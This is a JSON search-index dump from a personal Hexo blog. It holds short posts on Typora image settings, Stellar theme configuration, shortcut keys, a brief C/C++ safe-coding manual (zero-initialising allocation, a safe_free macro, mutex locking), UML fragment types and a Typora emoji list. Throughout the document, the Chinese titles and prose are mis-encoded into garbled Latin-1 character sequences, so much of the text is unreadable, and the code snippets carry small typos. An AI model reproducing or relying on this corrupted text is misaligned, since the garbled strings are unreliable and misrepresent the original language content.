&#123; color: #F77669;&#125;.cm-s-inner .cm-number &#123; color: #F77669;&#125;.cm-s-inner .cm-def &#123; color: rgba(233, 237, 237, 1);&#125;.cm-s-inner .cm-string &#123; color: #C3E88D;&#125;.cm-s-inner .cm-string-2 &#123; color: #80CBC4;&#125;.cm-s-inner .cm-comment &#123; color: #aebcc2;&#125;.cm-s-inner .cm-variable &#123; color: #82B1FF;&#125;.cm-s-inner .cm-tag &#123; color: #80CBC4;&#125;.cm-s-inner .cm-meta &#123; color: #80CBC4;&#125;.cm-s-inner .cm-attribute &#123; color: #FFCB6B;&#125;.cm-s-inner .cm-property &#123; color: #80CBAE;&#125;.cm-s-inner .cm-qualifier &#123; color: #DECB6B;&#125;.cm-s-inner .cm-variable-3 &#123; color: #DECB6B;&#125;.cm-s-inner .cm-tag &#123; color: rgba(255, 83, 112, 1);&#125;.cm-s-inner .cm-error &#123; color: rgba(255, 255, 255, 1.0); background-color: #EC5F67;&#125;.cm-s-inner .CodeMirror-matchingbracket &#123; text-decoration: underline; color: white !important;&#125;.cm-s-inner .cm-header,.cm-s-inner.cm-header &#123; color: #334EEA;&#125;.md-fences .code-tooltip &#123; background-color: #263238;&#125;","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"è‡ªå®šä¹‰","slug":"è‡ªå®šä¹‰","permalink":"https://hodlyounger.github.io/tags/%E8%87%AA%E5%AE%9A%E4%B9%89/"},{"name":"themes","slug":"themes","permalink":"https://hodlyounger.github.io/tags/themes/"},{"name":"ä¸ªæ€§åŒ–","slug":"ä¸ªæ€§åŒ–","permalink":"https://hodlyounger.github.io/tags/%E4%B8%AA%E6%80%A7%E5%8C%96/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªäººé…ç½®","slug":"E-æ‰‹å†Œ/ä¸ªäººé…ç½®","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"ã€é…ç½®ã€‘Typora å›¾åƒé…ç½®","date":"2023-10-27T01:24:02.486Z","path":"E_æ‰‹å†Œ/ä¸ªäººé…ç½®/ã€é…ç½®ã€‘Typoraå›¾åƒé…ç½®/","text":"å›¾ç‰‡ä¿å­˜è·¯å¾„ï¼š 1./$&#123;filename&#125;/ rename-file æ’ä»¶ä¸Šä¼ é…ç½® 1&#123;localFolder:3&#125;/&#123;origin&#125; å›¾æºï¼š 1https://source.unsplash.com/1280x640/?Technology","tags":[{"name":"ä¸ªæ€§åŒ–","slug":"ä¸ªæ€§åŒ–","permalink":"https://hodlyounger.github.io/tags/%E4%B8%AA%E6%80%A7%E5%8C%96/"},{"name":"typora","slug":"typora","permalink":"https://hodlyounger.github.io/tags/typora/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªäººé…ç½®","slug":"E-æ‰‹å†Œ/ä¸ªäººé…ç½®","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"ã€æ‰‹å†Œã€‘Stellar ä¸»é¢˜ç”¨æ³•","date":"2023-10-27T01:24:02.485Z","path":"E_æ‰‹å†Œ/ä¸ªäººé…ç½®/ã€æ‰‹å†Œã€‘Stellarä¸»é¢˜ç”¨æ³•/","text":"æ¦‚è¿°: Stellar ä¸»é¢˜çš„ç”¨æ³•æ•´ç† å¼•ç”¨æ–‡ç«  123456---references: - &#x27;[å¿ƒè·³ä¹‹æ—…â€”ğŸ’—â€”iOSç”¨æ‰‹æœºæ‘„åƒå¤´æ£€æµ‹å¿ƒç‡(PPG)](https://punmy.cn/2016/07/28/15231176397746.html) - &#x27;[PPGå…‰ç”µå®¹ç§¯è„‰ææ³¢æè®°æ³•æŠ€æœ¯æ¦‚å†µ](https://www.jianshu.com/p/695c131abfa5) ...--- projects.yml é…ç½® 12345678910111213141516171819202122Stellar: name: Stellar title: Hexo ä¸»é¢˜é…ç½® subtitle: &#x27;æ¯ä¸ªäººçš„ç‹¬ç«‹åšå®¢ | Designed by xaoxuu&#x27; tags: Hexo cover: false logo: src: /images/avator.png small: 112px large: 240px description: ä¸ªäººä½¿ç”¨è¿‡çš„ Hexo ä¸»é¢˜é…ç½®è®°å½• # repo: xaoxuu/hexo-theme-stellar # comment_title: &#x27;è¯„è®ºåŒºä»…ä¾›äº¤æµï¼Œæœ‰é—®é¢˜è¯·æ [issue](https://github.com/xaoxuu/hexo-theme-stellar/issues) åé¦ˆã€‚&#x27; # giscus: # data-repo: xaoxuu/hexo-theme-stellar # data-mapping: number # data-term: 226 sections: &#x27;å¿«é€Ÿå¼€å§‹&#x27;: [0, 99] &#x27;åŸºæœ¬ä½¿ç”¨&#x27;: [100, 199] &#x27;æ–‡æ¡£ç³»ç»Ÿ&#x27;: [200, 299] &#x27;è¿›é˜¶è®¾å®š&#x27;: [900, 999] æ–‡ç« è‡ªå®šä¹‰è¾¹æ  123456789sidebar: - toc - layout: markdown title: &#x27;é‡è¦é€šçŸ¥ [NOTE.2022-09]&#x27; content: | è¯·ä¸è¦åŸå°ä¸åŠ¨çš„æŠŠæœ¬ç«™å†…å®¹å¤åˆ¶åˆ°è´µç«™ä¸­ä½¿ç”¨ï¼Œè¿™æ ·ä¸€æ–¹é¢ä¸å°Šé‡åŸä½œè€…ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿä¼šå› ä¸ºå­˜åœ¨å¤§é‡é‡å¤å†…å®¹å½±å“è´µç«™æ”¶å½•ç”šè‡³é™æƒã€‚ ä»2022å¹´9æœˆèµ·æœ¬ç«™å·²ä¸å†å¼€æºï¼Œå·²ç»æŒæœ‰æºç å‰¯æœ¬æˆ–`fork`çš„æœ‹å‹è¯·åŠæ—¶åˆ é™¤ä»¥é˜²æ­¢è¢«ä»–äººæ¶æ„æ¬è¿çš„æƒ…å†µç»§ç»­å‘ç”Ÿã€‚ å°é¢ Stellar ä¸»é¢˜å¯ä»¥ä½¿ç”¨ UnSplash çš„å›¾ç‰‡ï¼Œå¯ä»¥å‚ç…§ä¸»é¢˜ Readme æ–‡æ¡£ä¸­ UnSplash ç« èŠ‚ã€‚å‚è€ƒæ–‡ç« ï¼šUnSplash è·å–éšæœºå›¾ç‰‡çš„API å¦å¤–ï¼Œå¦‚æœæ–‡ç« ä¸­æœ‰å›¾ç‰‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ–‡ç« å†…å›¾ç‰‡ä½œä¸ºæ–‡ç« å°é¢ï¼š 1../../&#123;ä»_postå¼€å§‹çš„å›¾ç‰‡è·¯å¾„ï¼Œä¸å«_post&#125; æ—¶é—´çº¿ 12&#123;% timeline api:https://api.github.com/repos/xaoxuu/hexo-theme-stellar/releases?per_page=1 %&#125;&#123;% endtimeline %&#125; FancyBox 1234// æ·»åŠ  data-fancybox å±æ€§newImgTag = newImgTag.replace(/(&lt;img.*?)(&gt;)/gi, function(ori, before, after) &#123; return before + &#x27; data-fancybox=&quot;true&quot;&#x27; + after;&#125;);","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"Stellar","slug":"Stellar","permalink":"https://hodlyounger.github.io/tags/Stellar/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªäººé…ç½®","slug":"E-æ‰‹å†Œ/ä¸ªäººé…ç½®","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"ã€é…ç½®ã€‘3-hexo ä¸»é¢˜å¿«æ·é”®","date":"2023-10-27T01:24:02.484Z","path":"E_æ‰‹å†Œ/ä¸ªäººé…ç½®/ã€é…ç½®ã€‘3-hexoä¸»é¢˜å¿«æ·é”®/","text":"å¿«æ·é”®ä¸ºvimé£æ ¼çš„ã€‚æŒ‰é”®å¯èƒ½ä¸vimiumï¼ˆchromeæ’ä»¶ï¼‰çš„å¿«æ·é”®æœ‰å†²çªï¼Œæ’ä»¶è®¾ç½®å±è”½æ‰æ­¤ç«™çš„å¿«æ·é”®å³å¯ è¯´æ˜ å…¨å±€ Key Descption s/S å…¨å±/å–æ¶ˆå…¨å± w/W æ‰“å¼€/å…³é—­æ–‡ç« ç›®å½• i/I è·å–æœç´¢æ¡†ç„¦ç‚¹ j/J å‘ä¸‹æ»‘åŠ¨ k/K å‘ä¸Šæ»‘åŠ¨ gg/GG åˆ°æœ€é¡¶ç«¯ shift+G/g åˆ°æœ€ä¸‹ç«¯ æœç´¢æ¡† Key Descption ESC 1.å¦‚æœè¾“å…¥æ¡†æœ‰å†…å®¹ï¼Œæ¸…é™¤å†…å®¹ 2.å¦‚æœè¾“å…¥æ¡†æ— å†…å®¹ï¼Œå¤±å»ç„¦ç‚¹ ä¸‹ å‘ä¸‹é€‰æ‹©æ–‡ç«  ä¸Š å‘ä¸Šé€‰æ‹©æ–‡ç«  å›è½¦ æ‰“å¼€å½“å‰é€‰ä¸­çš„æ–‡ç« ï¼Œè‹¥æ²¡æœ‰ï¼Œåˆ™é»˜è®¤æ‰“å¼€ç¬¬ä¸€ä¸ª å…³é—­å¿«æ·é”® åœ¨ä¸»é¢˜ä¸‹ _config.yml ä¸­ æ‰¾åˆ° shortcutKey è®¾ä¸º false 1shortcutKey: false","tags":[{"name":"hexo","slug":"hexo","permalink":"https://hodlyounger.github.io/tags/hexo/"},{"name":"å¿«æ·é”®","slug":"å¿«æ·é”®","permalink":"https://hodlyounger.github.io/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªäººé…ç½®","slug":"E-æ‰‹å†Œ/ä¸ªäººé…ç½®","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"ã€æ‰‹å†Œã€‘ä»£ç è§„èŒƒï¼Œå®‰å…¨ç¼–ç ","date":"2023-10-27T01:24:02.482Z","path":"E_æ‰‹å†Œ/ã€æ‰‹å†Œã€‘safecode/","text":"TrustClient ç›¸å…³ 1ï¼‰ win apiä½¿ç”¨å®æ§åˆ¶ 123#ifdef Q_OS_WIN #include &lt;Windows.h&gt;#endif å†…å­˜ç›¸å…³ å‡½æ•°æ®µ ç”³è¯·å†…å­˜ 12345678void *zallloc(size_t len) &#123; void *p = malloc(len); if(p) &#123; memset(p, 0, len); &#125; return p;&#125; å¸¸ç”¨çš„å® 1234#define safe_free(p) &#123;\\ free(p);\\ p = NULL;\\&#125;\\ çº¿ç¨‹çš„èµ„æºç«äº‰ å¯¹é“¾è¡¨ã€è¾¹ç•Œèµ„æºã€ä¸´ç•ŒåŒºåŸŸçš„æ“ä½œä¸€å®šè¦åŠ é” 12345678std::mutex mtx; // ä¿æŠ¤countermtx.lock();// è¦è¿›è¡Œçš„èµ„æºæ“ä½œtodo();mtx.unlock();","tags":[{"name":"code","slug":"code","permalink":"https://hodlyounger.github.io/tags/code/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"ã€æ‰‹å†Œã€‘UML ç‰‡æ®µè¯´æ˜","date":"2023-10-27T01:24:02.481Z","path":"E_æ‰‹å†Œ/UML/ã€æ‰‹å†Œã€‘ã€UMLã€‘ç‰‡æ®µè¯´æ˜/","text":"ç‰‡æ–­ç±»å‹ åç§° è¯´æ˜ Opt é€‰é¡¹ åŒ…å«ä¸€ä¸ªå¯èƒ½å‘ç”Ÿæˆ–å¯èƒ½ä¸å‘ç”Ÿçš„åºåˆ—ã€‚ èƒ½å¤Ÿåœ¨ä¸´ç•Œä¸­æŒ‡å®šåºåˆ—å‘ç”Ÿçš„æ¡ä»¶ã€‚ Alt æŠ‰æ‹© åŒ…å«ä¸€ä¸ªç‰‡æ–­åˆ—è¡¨ï¼Œè¿™äº›ç‰‡æ–­åŒ…å«å¤‡é€‰æ¶ˆæ¯åºåˆ—ã€‚ åœ¨ä»»ä½•åœºåˆä¸‹åªå‘ç”Ÿä¸€ä¸ªåºåˆ—ã€‚èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªç‰‡æ–­ä¸­è®¾ç½®ä¸€ä¸ªä¸´ç•Œæ¥æŒ‡ç¤ºè¯¥ç‰‡æ–­èƒ½å¤Ÿè¿è¡Œçš„æ¡ä»¶ã€‚ else çš„ä¸´ç•ŒæŒ‡ç¤ºå…¶ä½™ä»»ä½•ä¸´ç•Œéƒ½ä¸ä¸º True æ—¶åº”è¿è¡Œçš„ç‰‡æ–­ã€‚ è‹¥æ˜¯å…¨éƒ¨ä¸´ç•Œéƒ½ä¸º False è€Œä¸”æ²¡æœ‰ elseï¼Œåˆ™ä¸æ‰§è¡Œä»»ä½•ç‰‡æ–­ã€‚ Loop å¾ªç¯ ç‰‡æ–­é‡å¤å¿…å®šæ¬¡æ•°ã€‚ èƒ½å¤Ÿåœ¨ä¸´ç•Œä¸­æŒ‡ç¤ºç‰‡æ–­é‡å¤çš„æ¡ä»¶ã€‚Loop ç»„åˆç‰‡æ–­å…·å¤‡â€œMinâ€å’Œâ€œMaxâ€å±æ€§ï¼Œå®ƒä»¬æŒ‡ç¤ºç‰‡æ–­èƒ½å¤Ÿé‡å¤çš„æœ€å°å’Œæœ€å¤§æ¬¡æ•°ã€‚ é»˜è®¤å€¼æ˜¯æ— é™åˆ¶ã€‚ Break ä¸­æ–­ è‹¥æ˜¯æ‰§è¡Œæ­¤ç‰‡æ–­ï¼Œåˆ™æ”¾å¼ƒåºåˆ—çš„å…¶ä»–éƒ¨åˆ†ã€‚ å¯ä½¿ç”¨ä¸´ç•Œæ¥æŒ‡ç¤ºå‘ç”Ÿä¸­æ–­çš„æ¡ä»¶ã€‚ Par å¹¶è¡Œ å¹¶è¡Œå¤„ç†ã€‚ ç‰‡æ–­ä¸­çš„äº‹ä»¶èƒ½å¤Ÿäº¤é”™ã€‚ Critical å…³é”® ç”¨åœ¨ Par æˆ– Seq ç‰‡æ–­ä¸­ã€‚ æŒ‡ç¤ºæ­¤ç‰‡æ–­ä¸­çš„æ¶ˆæ¯ä¸å¾—ä¸å…¶ä½™æ¶ˆæ¯äº¤é”™ã€‚ Seq å¼±é¡ºåº æœ‰ä¸¤ä¸ªæˆ–æ›´å¤šæ“åšæ•°ç‰‡æ–­ã€‚ æ¶‰åŠåŒä¸€è¾ˆå­å‘½çº¿çš„æ¶ˆæ¯å¿…é¡»ä»¥ç‰‡æ–­çš„é¡ºåºå‘ç”Ÿã€‚ è‹¥æ˜¯æ¶ˆæ¯æ¶‰åŠçš„ç”Ÿå‘½çº¿ä¸ä¸€æ ·ï¼Œæ¥è‡ªä¸ä¸€æ ·ç‰‡æ–­çš„æ¶ˆæ¯å¯èƒ½ä¼šå¹¶è¡Œäº¤é”™ã€‚ Strict å¼ºé¡ºåº æœ‰ä¸¤ä¸ªæˆ–æ›´å¤šæ“åšæ•°ç‰‡æ–­ã€‚ è¿™äº›ç‰‡æ–­å¿…é¡»æŒ‰ç»™å®šé¡ºåºå‘ç”Ÿã€‚","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"UML","slug":"UML","permalink":"https://hodlyounger.github.io/tags/UML/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"UML","slug":"E-æ‰‹å†Œ/UML","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/UML/"}]},{"title":"ã€æ‰‹å†Œã€‘Typora Emoji","date":"2023-10-27T01:24:02.480Z","path":"E_æ‰‹å†Œ/ã€æ‰‹å†Œã€‘Typora Emoji/","text":"[toc] People ğŸ˜„ :smile: ğŸ˜† :laughing: ğŸ˜Š :blush: ğŸ˜ƒ :smiley: â˜ºï¸ :relaxed: ğŸ˜ :smirk: ğŸ˜ :heart_eyes: ğŸ˜˜ :kissing_heart: ğŸ˜š :kissing_closed_eyes: ğŸ˜³ :flushed: ğŸ˜Œ :relieved: ğŸ˜† :satisfied: ğŸ˜ :grin: ğŸ˜‰ :wink: ğŸ˜œ :stuck_out_tongue_winking_eye: ğŸ˜ :stuck_out_tongue_closed_eyes: ğŸ˜€ :grinning: ğŸ˜— :kissing: ğŸ˜™ :kissing_smiling_eyes: ğŸ˜› :stuck_out_tongue: ğŸ˜´ :sleeping: ğŸ˜Ÿ :worried: ğŸ˜¦ :frowning: ğŸ˜§ :anguished: ğŸ˜® :open_mouth: ğŸ˜¬ :grimacing: ğŸ˜• :confused: ğŸ˜¯ :hushed: ğŸ˜‘ :expressionless: ğŸ˜’ :unamused: ğŸ˜… :sweat_smile: ğŸ˜“ :sweat: ğŸ˜¥ :disappointed_relieved: ğŸ˜© :weary: ğŸ˜” :pensive: ğŸ˜ :disappointed: ğŸ˜– :confounded: ğŸ˜¨ :fearful: ğŸ˜° :cold_sweat: ğŸ˜£ :persevere: ğŸ˜¢ :cry: ğŸ˜­ :sob: ğŸ˜‚ :joy: ğŸ˜² :astonished: ğŸ˜± :scream: ğŸ˜« :tired_face: ğŸ˜  :angry: ğŸ˜¡ :rage: ğŸ˜¤ :triumph: ğŸ˜ª :sleepy: ğŸ˜‹ :yum: ğŸ˜· :mask: ğŸ˜ :sunglasses: ğŸ˜µ :dizzy_face: ğŸ‘¿ :imp: æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ ğŸ˜ˆ :smiling_imp: ğŸ˜ :neutral_face: ğŸ˜¶ :no_mouth: ğŸ˜‡ :innocent: ğŸ‘½ :alien: ğŸ’› :yellow_heart: ğŸ’™ :blue_heart: ğŸ’œ :purple_heart: â¤ï¸ :heart: ğŸ’š :green_heart: ğŸ’” :broken_heart: ğŸ’“ :heartbeat: ğŸ’— :heartpulse: ğŸ’• :two_hearts: ğŸ’ :revolving_hearts: ğŸ’˜ :cupid: ğŸ’– :sparkling_heart: âœ¨ :sparkles: â­ï¸ :star: ğŸŒŸ :star2: ğŸ’« :dizzy: ğŸ’¥ :boom: ğŸ’¥ :collision: ğŸ’¢ :anger: â—ï¸ :exclamation: â“ :question: â• :grey_exclamation: â” :grey_question: ğŸ’¤ :zzz: ğŸ’¨ :dash: ğŸ’¦ :sweat_drops: ğŸ¶ :notes: ğŸµ :musical_note: ğŸ”¥ :fire: ğŸ’© :hankey: ğŸ’© :poop: ğŸ’© :shit: ğŸ‘ :+1: ğŸ‘ :thumbsup: ğŸ‘ :-1: ğŸ‘ :thumbsdown: ğŸ‘Œ :ok_hand: ğŸ‘Š :punch: ğŸ‘Š :facepunch: âœŠ :fist: âœŒï¸ :v: ğŸ‘‹ :wave: âœ‹ :hand: âœ‹ :raised_hand: ğŸ‘ :open_hands: â˜ï¸ :point_up: ğŸ‘‡ :point_down: ğŸ‘ˆ :point_left: ğŸ‘‰ :point_right: ğŸ™Œ :raised_hands: ğŸ™ :pray: ğŸ‘† :point_up_2: ğŸ‘ :clap: ğŸ’ª :muscle: ğŸ¤˜ :metal: ğŸ–• :fu: ğŸš¶ :walking: ğŸƒ :runner: ğŸƒ :running: ğŸ‘« :couple: ğŸ‘ª :family: ğŸ‘¬ :two_men_holding_hands: ğŸ‘­ :two_women_holding_hands: ğŸ’ƒ :dancer: ğŸ‘¯ :dancers: ğŸ™† :ok_woman: ğŸ™… :no_good: ğŸ’ :information_desk_person: ğŸ™‹ :raising_hand: ğŸ‘° :bride_with_veil: ğŸ™ :person_with_pouting_face: ğŸ™ :person_frowning: ğŸ™‡ :bow: ğŸ’ :couplekiss: ğŸ’‘ :couple_with_heart: ğŸ’† :massage: ğŸ’‡ :haircut: ğŸ’… :nail_care: ğŸ‘¦ :boy: ğŸ‘§ :girl: ğŸ‘© :woman: ğŸ‘¨ :man: ğŸ‘¶ :baby: ğŸ‘µ :older_woman: ğŸ‘´ :older_man: ğŸ‘± :person_with_blond_hair: ğŸ‘² :man_with_gua_pi_mao: ğŸ‘³ :man_with_turban: ğŸ‘· :construction_worker: ğŸ‘® :cop: ğŸ‘¼ :angel: ğŸ‘¸ :princess: ğŸ˜º :smiley_cat: ğŸ˜¸ :smile_cat: ğŸ˜» :heart_eyes_cat: ğŸ˜½ :kissing_cat: ğŸ˜¼ :smirk_cat: ğŸ™€ :scream_cat: ğŸ˜¿ :crying_cat_face: ğŸ˜¹ :joy_cat: ğŸ˜¾ :pouting_cat: ğŸ‘¹ :japanese_ogre: ğŸ‘º :japanese_goblin: ğŸ™ˆ :see_no_evil: ğŸ™‰ :hear_no_evil: ğŸ™Š :speak_no_evil: ğŸ’‚ :guardsman: ğŸ’€ :skull: ğŸ¾ :feet: ğŸ‘„ :lips: ğŸ’‹ :kiss: ğŸ’§ :droplet: ğŸ‘‚ :ear: ğŸ‘€ :eyes: ğŸ‘ƒ :nose: ğŸ‘… :tongue: ğŸ’Œ :love_letter: ğŸ‘¤ :bust_in_silhouette: ğŸ‘¥ :busts_in_silhouette: ğŸ’¬ :speech_balloon: ğŸ’­ :thought_balloon: æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ Nature â˜€ï¸ :sunny: â˜”ï¸ :umbrella: â˜ï¸ :cloud: â„ï¸ :snowflake: â›„ï¸ :snowman: âš¡ï¸ :zap: ğŸŒ€ :cyclone: ğŸŒ :foggy: ğŸŒŠ :ocean: ğŸ± :cat: ğŸ¶ :dog: ğŸ­ :mouse: ğŸ¹ :hamster: ğŸ° :rabbit: ğŸº :wolf: ğŸ¸ :frog: ğŸ¯ :tiger: ğŸ¨ :koala: ğŸ» :bear: ğŸ· :pig: ğŸ½ :pig_nose: ğŸ® :cow: ğŸ— :boar: ğŸµ :monkey_face: ğŸ’ :monkey: ğŸ´ :horse: ğŸ :racehorse: ğŸ« :camel: ğŸ‘ :sheep: ğŸ˜ :elephant: ğŸ¼ :panda_face: ğŸ :snake: ğŸ¦ :bird: ğŸ¤ :baby_chick: ğŸ¥ :hatched_chick: ğŸ£ :hatching_chick: ğŸ” :chicken: ğŸ§ :penguin: ğŸ¢ :turtle: ğŸ› :bug: ğŸ :honeybee: ğŸœ :ant: ğŸ :beetle: ğŸŒ :snail: ğŸ™ :octopus: ğŸ  :tropical_fish: ğŸŸ :fish: ğŸ³ :whale: ğŸ‹ :whale2: ğŸ¬ :dolphin: ğŸ„ :cow2: ğŸ :ram: ğŸ€ :rat: ğŸƒ :water_buffalo: ğŸ… :tiger2: ğŸ‡ :rabbit2: ğŸ‰ :dragon: ğŸ :goat: ğŸ“ :rooster: ğŸ• :dog2: ğŸ– :pig2: ğŸ :mouse2: ğŸ‚ :ox: ğŸ² :dragon_face: ğŸ¡ :blowfish: ğŸŠ :crocodile: ğŸª :dromedary_camel: ğŸ† :leopard: ğŸˆ :cat2: ğŸ© :poodle: ğŸ¾ :paw_prints: ğŸ’ :bouquet: ğŸŒ¸ :cherry_blossom: ğŸŒ· :tulip: ğŸ€ :four_leaf_clover: ğŸŒ¹ :rose: ğŸŒ» :sunflower: ğŸŒº :hibiscus: ğŸ :maple_leaf: ğŸƒ :leaves: ğŸ‚ :fallen_leaf: ğŸŒ¿ :herb: ğŸ„ :mushroom: ğŸŒµ :cactus: ğŸŒ´ :palm_tree: ğŸŒ² :evergreen_tree: ğŸŒ³ :deciduous_tree: ğŸŒ° :chestnut: ğŸŒ± :seedling: ğŸŒ¼ :blossom: ğŸŒ¾ :ear_of_rice: ğŸš :shell: ğŸŒ :globe_with_meridians: ğŸŒ :sun_with_face: ğŸŒ :full_moon_with_face: ğŸŒš :new_moon_with_face: ğŸŒ‘ :new_moon: ğŸŒ’ :waxing_crescent_moon: ğŸŒ“ :first_quarter_moon: ğŸŒ” :waxing_gibbous_moon: ğŸŒ• :full_moon: ğŸŒ– :waning_gibbous_moon: ğŸŒ— :last_quarter_moon: ğŸŒ˜ :waning_crescent_moon: ğŸŒœ :last_quarter_moon_with_face: ğŸŒ› :first_quarter_moon_with_face: ğŸŒ” :moon: ğŸŒ :earth_africa: ğŸŒ :earth_americas: ğŸŒ :earth_asia: ğŸŒ‹ :volcano: ğŸŒŒ :milky_way: â›…ï¸ :partly_sunny: æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ Objects ğŸ :bamboo: ğŸ’ :gift_heart: ğŸ :dolls: ğŸ’ :school_satchel: ğŸ“ :mortar_board: ğŸ :flags: ğŸ† :fireworks: ğŸ‡ :sparkler: ğŸ :wind_chime: ğŸ‘ :rice_scene: ğŸƒ :jack_o_lantern: ğŸ‘» :ghost: ğŸ… :santa: ğŸ„ :christmas_tree: ğŸ :gift: ğŸ”” :bell: ğŸ”• :no_bell: ğŸ‹ :tanabata_tree: ğŸ‰ :tada: ğŸŠ :confetti_ball: ğŸˆ :balloon: ğŸ”® :crystal_ball: ğŸ’¿ :cd: ğŸ“€ :dvd: ğŸ’¾ :floppy_disk: ğŸ“· :camera: ğŸ“¹ :video_camera: ğŸ¥ :movie_camera: ğŸ’» :computer: ğŸ“º :tv: ğŸ“± :iphone: â˜ï¸ :phone: â˜ï¸ :telephone: ğŸ“ :telephone_receiver: ğŸ“Ÿ :pager: ğŸ“  :fax: ğŸ’½ :minidisc: ğŸ“¼ :vhs: ğŸ”‰ :sound: ğŸ”ˆ :speaker: ğŸ”‡ :mute: ğŸ“¢ :loudspeaker: ğŸ“£ :mega: âŒ›ï¸ :hourglass: â³ :hourglass_flowing_sand: â° :alarm_clock: âŒšï¸ :watch: ğŸ“» :radio: ğŸ“¡ :satellite: â¿ :loop: ğŸ” :mag: ğŸ” :mag_right: ğŸ”“ :unlock: ğŸ”’ :lock: ğŸ” :lock_with_ink_pen: ğŸ” :closed_lock_with_key: ğŸ”‘ :key: ğŸ’¡ :bulb: ğŸ”¦ :flashlight: ğŸ”† :high_brightness: ğŸ”… :low_brightness: ğŸ”Œ :electric_plug: ğŸ”‹ :battery: ğŸ“² :calling: âœ‰ï¸ :email: ğŸ“« :mailbox: ğŸ“® :postbox: ğŸ›€ :bath: ğŸ› :bathtub: ğŸš¿ :shower: ğŸš½ :toilet: ğŸ”§ :wrench: ğŸ”© :nut_and_bolt: ğŸ”¨ :hammer: ğŸ’º :seat: ğŸ’° :moneybag: ğŸ’´ :yen: ğŸ’µ :dollar: ğŸ’· :pound: ğŸ’¶ :euro: ğŸ’³ :credit_card: ğŸ’¸ :money_with_wings: ğŸ“§ :e-mail: ğŸ“¥ :inbox_tray: ğŸ“¤ :outbox_tray: âœ‰ï¸ :envelope: ğŸ“¨ :incoming_envelope: ğŸ“¯ :postal_horn: ğŸ“ª :mailbox_closed: ğŸ“¬ :mailbox_with_mail: ğŸ“­ :mailbox_with_no_mail: ğŸšª :door: ğŸš¬ :smoking: ğŸ’£ :bomb: ğŸ”« :gun: ğŸ”ª :hocho: ğŸ’Š :pill: ğŸ’‰ :syringe: ğŸ“„ :page_facing_up: ğŸ“ƒ :page_with_curl: ğŸ“‘ :bookmark_tabs: ğŸ“Š :bar_chart: ğŸ“ˆ :chart_with_upwards_trend: ğŸ“‰ :chart_with_downwards_trend: ğŸ“œ :scroll: ğŸ“‹ :clipboard: ğŸ“† :calendar: ğŸ“… :date: ğŸ“‡ :card_index: ğŸ“ :file_folder: ğŸ“‚ :open_file_folder: âœ‚ï¸ :scissors: ğŸ“Œ :pushpin: ğŸ“ :paperclip: âœ’ï¸ :black_nib: âœï¸ :pencil2: ğŸ“ :straight_ruler: ğŸ“ :triangular_ruler: ğŸ“• :closed_book: ğŸ“— :green_book: ğŸ“˜ :blue_book: ğŸ“™ :orange_book: ğŸ““ :notebook: ğŸ“” :notebook_with_decorative_cover: ğŸ“’ :ledger: ğŸ“š :books: ğŸ”– :bookmark: ğŸ“› :name_badge: ğŸ”¬ :microscope: ğŸ”­ :telescope: ğŸ“° :newspaper: ğŸˆ :football: ğŸ€ :basketball: âš½ï¸ :soccer: âš¾ï¸ :baseball: ğŸ¾ :tennis: ğŸ± :8ball: ğŸ‰ :rugby_football: ğŸ³ :bowling: â›³ï¸ :golf: ğŸšµ :mountain_bicyclist: ğŸš´ :bicyclist: ğŸ‡ :horse_racing: ğŸ‚ :snowboarder: ğŸŠ :swimmer: ğŸ„ :surfer: ğŸ¿ :ski: â™ ï¸ :spades: â™¥ï¸ :hearts: â™£ï¸ :clubs: â™¦ï¸ :diamonds: ğŸ’ :gem: ğŸ’ :ring: ğŸ† :trophy: ğŸ¼ :musical_score: ğŸ¹ :musical_keyboard: ğŸ» :violin: ğŸ‘¾ :space_invader: ğŸ® :video_game: ğŸƒ :black_joker: ğŸ´ :flower_playing_cards: ğŸ² :game_die: ğŸ¯ :dart: ğŸ€„ï¸ :mahjong: ğŸ¬ :clapper: ğŸ“ :memo: ğŸ“ :pencil: ğŸ“– :book: ğŸ¨ :art: ğŸ¤ :microphone: ğŸ§ 